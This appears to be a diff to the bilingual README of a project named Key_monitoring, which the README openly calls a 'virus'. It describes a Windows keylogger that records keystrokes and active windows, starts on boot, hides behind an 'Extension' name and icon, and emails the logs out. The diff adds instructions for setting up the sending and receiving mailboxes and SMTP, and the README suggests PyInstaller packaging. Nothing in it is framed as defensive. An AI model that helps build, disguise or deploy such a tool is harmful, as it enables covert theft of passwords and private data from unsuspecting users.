@@ -4,7 +4,7 @@
 
 记录主机的键位及按键时所在窗口，开机自启动，判断可连接互联网时将记录的日志发送至指定的邮箱。
 
-注意修改 Key_monitoring/Extension.py 代码中的邮箱设置。
+注意修改 Key_monitoring/Extension.py 代码中的邮箱设置（需一个发送邮箱和一个接受邮箱，需在邮箱官网开启SMTP服务）。
 
 修改完成后可利用 PyInstaller 将代码打包为 Extension.exe 可执行程序，打包方法请参考：http://www.pyinstaller.org/ 。
 
@@ -15,7 +15,7 @@
 
 Key_monitoring "virus", can be packaged as a Windows executable program, using Extension's icon and named in order to disguise.
 
-Record the host key and the window, boot from the start, to determine the Internet can be connected to the log will be sent to the specified mailbox.
+Record the host key and the window, boot from the start, to determine the Internet can be connected to the log will be sent to the specified mailbox （ Need a send mailbox and an accept mailbox, you need to open the SMTP service in the mailbox official website ）.
 
 Note Modify the mailbox settings in the Key_monitoring / Extension.py code.
 
